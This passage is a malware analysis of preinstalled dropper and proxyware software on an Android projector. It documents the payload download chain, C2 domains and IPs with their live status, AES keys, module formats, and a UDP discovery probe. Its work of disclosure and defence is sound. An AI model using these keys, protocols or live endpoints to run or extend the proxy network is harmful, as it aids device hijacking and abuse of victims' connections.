`GET http://isdownload.ishanghd.com/work/app/wj/plugin/infos_9269.json` delivers `plugin.jar` which is downloaded to `<cache>/plugin.jar` loaded with `DexClassLoader`. `com.anlytics.plug.ParserUtils.AnalyticsHelper("test")` is the entry point.

**Per-device app-list profile**
These are the custom apps for each device in the campaign (probably patched to circumvent DRM?)

`com.anlytics.plug.b` fingerprints the board (`ro.board.platform`, `persist.sys.cm.dtsmodel`, `ro.sys.cputype`, `ro.build.version.release`, installed packages, files like `/system/etc/voice.tar.gz`) against 40 hardcoded profiles and picks the fitting `appsinfo/.../infos*.json` URL from the constants in `com.tools.a`.

This device ships `com.ashd.launcher10` and reports `persist.sys.cm.dtsmodel=AT-M269` / board `ares` and the only H713 "launcher10" profile is:

```
http://ty.ishanghd.com/work/app/wj/appsinfo/H713_ASHD/H713_GBPT_HY300A_720P/infos_launcher10.json
```

```json
date	20240819
description	"1、优化网络访问\n2、增强系统稳定性。"
appInfos
0
appVersionCode	425
appName	"uninstall"
appPkgName	"com.netflix.ninja"
appMd5	"3D3EC4CAA09F68170EB0ADC5A92AC018"
appUrl	"http://isdownload.ishanghd.com/work/app/wj/app/rk3326/Netflix_425.apk"
1
appVersionCode	84
appName	"launcher10"
appPkgName	"com.ashd.launcher10"
appMd5	"3AA639AE6850189EB8EB4B288AFAD70A"
appUrl	"http://isdownload.ishanghd.com/work/app/wj/app/H713/Launcher10_HY300_1.84.apk"
2
appVersionCode	3
appName	"platinum"
appPkgName	"com.allwinnertech.platinum.media"
appMd5	"5DA2127B3D0E983D96C16F5960CFE5E0"
appUrl	"http://isdownload.ishanghd.com/work/app/wj/app/H713/PlatinumMediaDLNA.apk"
```

**Full list of 40 profile URLs**
Each is probably a victim device family under the same campaign:

```
infos.json
TEST/infos.json
infos_qp.json
infos_lm.json
infos_wy.json
infos_wy_fj600.json
infos_set.json
infos_ydd3128.json
WANYING_test/infos.json
YBS_ASOS/infos.json
YDN2_YIUI_RX480P/infos.json
YINGKE_CC720P/infos_0208.json
YINGKE_CC720P/infos_ZG_0315.json
YINGKE_CC720P/infos_0313.json
YINGKE_CC720P/infos_0504.json
SAIER_RK3326_DV381_YIUI/infos.json
SAIER_RK3326_DV381_YIUI_C1PRO/infos.json
rk3326_ASHD/Q3/infos.json  H713/N1/infos.json
rk3326/HY300A/infos.json
rk3326/Saier_zhixiang_0326/infos.json  YKK_3326_YIUI/infos.json
rk3326_ASHD/RK3326_ASHD_X1_SUR269_AHW_OLD/infos.json
rk3326_ASHD/RK3326_ASHD_X1_SUR269_AHW_DSN/infos.json
rk3326_ASHD/RK3326_HY300A_YM_SUR269_AHW/infos_dsn.json
rk3326/HY300A_GBPT_HP265013_AHW/infos_0611.json
rk3326_ASHD/RK3326_HY300A_GBPT_HP265013_AHW/infos_dsn.json
rk3326_ASHD/RK3326_HY300A_GBPT_HP265013_AHW_OLDNFX/infos.json
rk3326_ASHD/BNX_TXD265_AHW_3+64_Lingbo/infos2.json
rk3326_ASHD/RK3326_GBPT_720P_CAOYING/infos.json
rk3326_ASHD/RK3326_GBPT_LAUNCHER10/infos.json
rk3326_ASHD/RK3326_HY300A_JUYING1_8_HP265013_AHW/infos.json
H713_ASHD/H713_GBPT_HY300A_720P/infos.json
H713_ASHD/H713_HY300A_720P_YIRUO/infos_0304.json
H713_ASHD/H713_GBPT_HY300A_720P/infos_games_1207.json
H713_ASHD/H713_GBPT_HY300A_720P/infos_games_0221.json
H713_ASHD/H713M_HY300PRO_MAX_HP269006_BAT/infos_1220.json
H713_ASHD/H713M_HY300A_VIEW_0304/infos.json
H713_ASHD/H713_GBPT_HY300A_720P/infos_0318.json
H713_ASHD/H713_SKW/infos.json
H713_ASHD/H713_NEFHELP/infos.json
H713_ASHD/DSN/infos.json
rk3326_ASHD/DSN/infos.json
rk3326_ASHD/RK3326_AD/infos_ad_asos.json
H713_ASHD/H713_HY300_HIFI/infos.json
H713_ASHD/H713M_HY300_A/infos_F8.json
H713_ASHD/H713M_TENPLUS_0625/infos.json
H713_ASHD/H713_GBPT_HY300A_720P/infos_launcher10.json
Hisi352_ASHD/TS-6/infos_0730.json
H723_ASHD/H723_T1Pro/infos_0618.json
```

Each `infos*.json` lists the apps to `pm install -r` (payload `com.google.adtest` + cover apps like Disney+) as covered in 3..

### 9.3 plugin.jar

**C2 host encryption**
`com.hs.p.basic.Hosts`/`EncryptUtils`
Each host string is `AES/CFB/NoPadding` (key `MD5("ota.host.a46780a24111f056d95f955462606901")`, IV `"0102030405060708"`), gzip-compressed, then base64:

- `API_MASTER_HOSTS`: `https://api.loritor.cc/`
- `TRACKER_SLAVE_HOSTS`: `https://api.loritor.cc/`
- `API_SLAVE_HOSTS`: `https://api.nizero.cc/`
- `TRACKER_MASTER_HOSTS`: `https://api.nizero.cc/` (swapped priority vs. API channel?)

Both loritor.cc and nizero.cc seemed down at the time of this testing.

**Task/config API paths**
`GetTaskApi`, `GetConfigApi`
`POST <host>/0x01/ov/x1` (config: silent windows, log toggle, host list push, poll period) and `POST <host>/0x01/ov/x2` (task list: cursor-paginated `jars[]`/`dexs[]`/`apks[]`, each with `file_url`/`file_md5`/`vercode`/`task_id`). Response body's `"data"` field is encrypted the same way, key `"ota.api.d3b194c07b63d688969c258719ca3f0f"`.

**`.rf` module format**
Decrypting all four modules I have with valid DSA signatures:
`[4B version][4096B pad][32B salt][4B+N invocation AES-CFB][4B+N module AES-CFB][4B+N DSA sig]`.

AES key = `MD5("968a84be78d3421d5e771147dce2b766" + salt)`, same fixed IV as above.

DSA public key is hardcoded (1024-bit, embedded in `DexManager`/`JarExe`). The plaintext is a ZIP/APK, not a raw dex.

```
SKN0041: {"cn":"com.hotota.p.d.MainApi","m_init":"start_W0017","m_uninit":"stop"}
SKN0054: {"cn":"com.hotota.p.d.MainApi","m_init":"start_W0028","m_uninit":"stop"}
SKN0058: {"cn":"com.hotota.p.d.MainApi","m_init":"start_W0032","m_uninit":"stop"}
SKN0061: {"cn":"com.hotota.p.d.MainApi","m_init":"start_W0035","m_uninit":"stop"}
```

### 9.4 com.ad.proxy

`SKN0041`

Entry `MainApi.start_W0017` spins up client `Robin`. Two plain HTTP(S) endpoints, `channel`/`version` supplied by whoever invoked the module:

```
GET  https://api.kookjar.com/signin?uuid=<uuid>&channel=<channel>&version=<version>
# (debug build: http://152.32.240.141 same paths)
POST https://api.kookjar.com/report?uuid=<uuid>&channel=<channel>&version=<version>
     body: {"gateway_list":[{"host":..,"port":..,"status":..}, ...]}
     # reports back which proxy gateways it reached
```

### 9.5 com.szns.sdk

`SKN0054`

Domain/IP strings here are obfuscated: `Base64→XOR(fixed key) > XOR(prev result) > MD5-derived XOR > Base64 > gzip` in class `com.szns.sdk.t`.

Replicated the exact algorithm (`analysis/tools/decode_szns_t.py`) and decrypted all four hardcoded bootstrap endpoints:

```
ac.a()
  ->  https://hgsdkszns.com
ac.b()
  ->  http://dporder.midrouterx.com/api/dispatch
      (state 1: fetch "domain_info", cached 24h)
ac.c()
  ->  https://seed-info.oss-ap-southeast-1.aliyuncs.com/favorite.ico
      (state 3: OSS bootstrap; body is a plain URL: "http://dporder.midrouterx.com/api/dispatchByOss")
ac.d()
  ->  43.173.127.241:9090
      (state 5: "ip_tcp_info" bootstrap)
```

If no cached dispatch URL (state 7):
UDP sweep of `43.153.12.1` - `43.153.80.100:8080`

Sending the literal ASCII payload `"moon2"`, waiting for any reply starting with `http`.

Each bootstrap request is `POST <url>` with form fields `{"operator":<c>,"c":"moon2","name":<d>}` in `com.szns.sdk.x`.

Whichever dispatch URL resolves is then POSTed the same fields and returns the real gateway list, encrypted as `AES/CBC/PKCS5` (key `"5360e2884c119aa32a767ceb1c0889b0"`, random IV, envelope `base64(iv):base64(ciphertext)`)

Decrypted JSON format: `{"data":{"schedule":N,"thread":N,"heartbeat":N,"st":N,"node":[{"connect":"host:port","proxy":"host:port"}, ...]}}`.

### 9.6. com.link.core

`SKN0058 `

Single hardcoded gateway, no discovery layer: `com.link.core.a.g` → `["api.eviceh.cc:16000"]`. DNS resolvers used for its own lookups: `8.8.8.8`, `9.9.9.9`, `1.1.1.1`, `1.0.0.1`. Reads `/proc/cpuinfo` and `/sys/class/net/{eth0,wlan0}/address` for device fingerprinting.

### 9.7. ddth2 (VpsSdk)

`SKN0061`

Hardcoded gateway pool, `ddth2.hidden.o`: domains `dw4y.mmavlino.com`, `zx8c.llvyomi.net`, `zxn5.p2f7mjhv.eu.cc`, IPs `45.43.57.99`, `165.154.135.52`.

A persistent custom binary TCP protocol:

- connect
- `REGISTER`/`REGISTER_ACK` handshake (8-byte frame header, opcode+length)
- gateway then pushes connect commands (`{host, port}`
- filtered against private/loopback/multicast ranges that spawn per-session proxied sockets, explaining the "many parallel client instances".

### 9.8. com.google.adtest

or `com.fotas.wanapp ("com.speed")`

Real internal package name is `com.fotas.wanapp` (App class `com.fotas.wanapp.APP`). `onCreate()` sets up three hosts the same master/slave/random pattern as `plugin.jar`:

```
master -> https://api.pechlo.cc/
slave  -> https://api.logobi.cc/
random -> https://random.vivosoc.cc/
```

Device check-in happens through `POST https://codedevapp.com/api/v1/device/dau`.

Two services are started:

- `com.google.android.AdService`
- `com.google.android.BakService`

Reflectively probes for and initializes an optional `com.fotas.wanapp.ChannelSdkInit` class if present. App id strings: `"wanapp"`, `"WAN_AISHANG_001"`.

### 9.9. Live status snapshot (2026-09-26)

Read-only reachability check from an independent host (no proxy protocol/payloads sent, no interaction with the projector itself):

| Host                                                                                                | DNS / connect result                                                         | Notes                                                                         |
| --------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| `api.loritor.cc`, `api.nizero.cc`                                                                   | resolves (Cloudflare), HTTP 404 on `/`                                       | alive; real paths are `/0x01/ov/x1`, `/0x01/ov/x2`                            |
| `api.kookjar.com`                                                                                   | resolves (Cloudflare, 172.67.159.65), HTTP 204                               | alive                                                                         |
| `152.32.240.141` (SKN0041 debug fallback)                                                           | TCP/80 timeout                                                               | not reachable; debug-only path anyway, production uses `api.kookjar.com`      |
| `dporder.midrouterx.com`                                                                            | resolves direct (43.174.196.241, Tencent Cloud), HTTP 200 on `/api/dispatch` | **alive**                                                                     |
| `seed-info.oss-ap-southeast-1.aliyuncs.com`                                                         | resolves (47.79.49.170, Alibaba Cloud SG), HTTP 200, serves `favorite.ico`   | **alive**                                                                     |
| `hgsdkszns.com`                                                                                     | resolves (Cloudflare)                                                        | DNS alive; plain HTTPS probe reset (unused branch in current build, see 10.5) |
| `43.173.127.241:9090`                                                                               | **raw TCP connect succeeds**                                                 | **alive, listening right now**                                                |
| `api.eviceh.cc:16000`                                                                               | resolves (152.53.83.204)                                                     | DNS alive, TCP/16000 refused at check time (gateway not currently listening)  |
| `dw4y.mmavlino.com` / `zx8c.llvyomi.net` / `zxn5.p2f7mjhv.eu.cc` / `45.43.57.99` / `165.154.135.52` | not re-checked this pass                                                     | see section 11                                                                |
| `api.pechlo.cc`, `api.logobi.cc`                                                                    | resolve (Cloudflare), HTTP 404 on `/`                                        | alive                                                                         |
| `random.vivosoc.cc`                                                                                 | **no DNS record**                                                            | appears dead/expired                                                          |
| `codedevapp.com`                                                                                    | resolves (5.161.41.216, Hetzner)                                             | alive; `/api/v1/device/dau` is POST-only so a bare GET aborts                 |

## 10. URLs

| Host / URL                                                                                                                  | Component                                 | Role                                                                                                                           |
| --------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `ishanghd.com`, `ty.ishanghd.com`, `isdownload.ishanghd.com`, `wjtysj.ishanghd.com`                                         | sysapp, yiyou                             | root OEM backend domain                                                                                                        |
| `wjtysj.ishanghd.com/hx_kt.php`                                                                                             | sysapp (AshdSysApp)                       | OTA updater C2 (`act=project&do=getPackageInfo`)                                                                               |
| `ty.ishanghd.com/work/app/wj/factory/update.json`                                                                           | yiyou                                     | dropper self-update pointer                                                                                                    |
| `ty.ishanghd.com/work/app/wj/appsinfo/*` (40 paths, see above)                                                              | yiyou                                     | per-device-family payload/app lists (`pm install -r` targets)                                                                  |
| `isdownload.ishanghd.com/work/app/wj/plugin/infos_9269.json`                                                                | yiyou                                     | `plugin.jar` fetch pointer                                                                                                     |
| `isdownload.ishanghd.com/work/app/wj/plugin/plugin/2026082800/plugin.jar`                                                   | yiyou                                     | actual `plugin.jar` payload (versioned path, changes over time)                                                                |
| `isdownload.ishanghd.com/work/app/wj/app/rk3326/L3.zip`                                                                     | plugin.jar                                | Widevine L3 DRM key/licence bundle, dropped so streaming apps run on the uncertified device                                    |
| `api.loritor.cc`, `api.nizero.cc`                                                                                           | plugin.jar ("hs")                         | task/config API (`/0x01/ov/x1`, `/0x01/ov/x2`), both as API channel (master/slave) and tracker channel (slave/master swapped)  |
| `api.kookjar.com` (+ `152.32.240.141` debug)                                                                                | SKN0041                                   | `/signin`, `/report`                                                                                                           |
| `api.eviceh.cc:16000`                                                                                                       | SKN0058                                   | sole gateway                                                                                                                   |
| `hgsdkszns.com`                                                                                                             | SKN0054                                   | additional hardcoded bootstrap host (unused branch in current build)                                                           |
| `dporder.midrouterx.com/api/dispatch` (+ `/api/dispatchByOss`, reached via the OSS bootstrap below)                         | SKN0054                                   | primary dispatch bootstrap                                                                                                     |
| `seed-info.oss-ap-southeast-1.aliyuncs.com/favorite.ico`                                                                    | SKN0054                                   | OSS-hosted bootstrap redirector (Alibaba Cloud OSS)                                                                            |
| `seed-1303252866.cos.na-siliconvalley.myqcloud.com/favorite.ico`                                                            | SKN0054                                   | Tencent COS backup mirror of the same bootstrap config                                                                         |
| `43.173.127.241:9090`                                                                                                       | SKN0054                                   | `ip_tcp_info` bootstrap host (exact port confirmed, live)                                                                      |
| `43.135.136.224`                                                                                                            | SKN0054                                   | dispatch gateway observed live (tcp/7788 `/api/dispatch`, tcp/9090)                                                            |
| `43.159.148.198`                                                                                                            | SKN0054                                   | gateway/server-list endpoint observed live, `/dp/getServer` (probably returned dynamically inside the encrypted `node[]` list) |
| `43.130.60.175`                                                                                                             | SKN0054                                   | additional proxy gateway node (tcp/9090), observed live                                                                        |
| `43.153.12.1`–`43.153.80.100:8080` (UDP)                                                                                    | SKN0054                                   | discovery sweep; probe payload is literal ASCII `moon2`                                                                        |
| `dw4y.mmavlino.com`, `zx8c.llvyomi.net`, `zxn5.p2f7mjhv.eu.cc`, `45.43.57.99`, `165.154.135.52`                             | SKN0061                                   | gateway pool, custom TCP proxy protocol                                                                                        |
| `api.pechlo.cc`, `api.logobi.cc`, `random.vivosoc.cc`                                                                       | com.speed / com.fotas.wanapp              | master/slave/random C2                                                                                                         |
| `codedevapp.com/api/v1/device/dau`                                                                                          | com.speed / com.fotas.wanapp              | device check-in                                                                                                                |
| `live.sz-cloudmedia.com:8080/ota/`                                                                                          | legacy OTA (older/sibling sysapp variant) | dead end, The domain has no ICP filing, Alibaba blocks it.                                                                     |
| `ulogs.umeng.com`, `ulogs.umengcloud.com`, `alogus.umeng.com`, `alogsus.umeng.com`, `ouplog.umeng.com`, `plbslog.umeng.com` | yiyou (Umeng SDK)                         | third-party analytics telemetry, carrying the device fingerprints (serial, MACs, SSID/BSSID) yiyou app collects                |
| `hmma.baidu.com`, `datax.baidu.com`, `dxp.baidu.com`, `openrcv.baidu.com`                                                   | yiyou (Baidu Mobile Stats SDK)            | same telemetry role, via Baidu                                                                                                 |
| `cmnsguider.yunos.com`, `ip.taobao.com`, `g3.le.com`                                                                        | yiyou                                     | Alibaba/Yunos device-token and public-IP lookup services used for fingerprinting                                               |

## 11. Other

Developer options:

1. `Deviceversion.onKeyDown` (Settings' "Device info" screen) watches for a Konami style code, Up Up Down Down Left Left Right Right Center Center, which tries to open developer options. For me this didn't work.
2. Up Down Left Right Center tries to launch `com.konka.readmain.MainActivity`, an unrelated OEM factory-test app that isn't actually installed on this unit. Same, didn't work.

```
adb shell am start -n com.ashd.settings/com.rk_itvui.settings.deviceversion.Deviceversion
adb shell input keyevent 19
adb shell input keyevent 19
adb shell input keyevent 20
adb shell input keyevent 20
adb shell input keyevent 21
adb shell input keyevent 21
adb shell input keyevent 22
adb shell input keyevent 22
adb shell input keyevent 23
adb shell input keyevent 23
```
